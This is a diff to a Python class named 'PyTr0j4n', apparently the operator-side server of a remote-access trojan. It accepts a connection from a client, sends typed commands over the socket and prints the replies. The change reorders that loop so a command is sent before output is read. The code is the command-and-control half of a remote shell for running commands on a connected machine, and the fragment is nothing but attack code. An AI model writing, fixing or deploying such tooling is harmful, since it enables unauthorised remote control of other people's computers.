@@ -51,14 +51,14 @@ class PyTr0j4n:
         try:
             print(f"{COLOR_GREEN}[*] Accepted connection from {client_address[0]}:{client_address[1]}\n")
             while True:
+                response = input(f"{COLOR_YELLOW}Enter command (or '/exit' to quit): \n")
+                if(response.lower() == "exit"):
+                    self.stopServer()
+                client_socket.sendall(response.encode('utf-8'))
                 data = client_socket.recv(1024)
                 if not data:
                     break
                 print(f"{COLOR_RESET}{data.decode('utf-8')}")
-                response = input(f"{COLOR_YELLOW}\nEnter command (or '/exit' to quit): \n")
-                if(response.lower() == "exit"):
-                    self.stopServer()
-                client_socket.sendall(response.encode('utf-8'))
         except Exception as e:
             print(f"{COLOR_RED} Error handling client: {e}")
         finally:
